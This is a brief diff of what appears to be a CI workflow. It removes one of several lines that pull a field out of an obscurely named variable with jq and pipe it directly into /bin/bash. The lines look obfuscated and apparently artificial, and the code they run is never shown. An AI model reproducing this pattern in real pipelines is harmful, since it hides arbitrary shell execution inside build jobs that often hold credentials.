@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$uq1" | jq -r .wkvyx49857 | /bin/bash
           echo $yaeb06 | jq -r .f52 | /bin/bash
           printf '%s' "$hpmbi50" | jq -r .buti5 | /bin/bash
-          echo $patp2866 | jq -r .yl7709 | /bin/bash
           echo $se0113 | jq -r .hrkdw70 | /bin/bash
 
       - name: Archive output
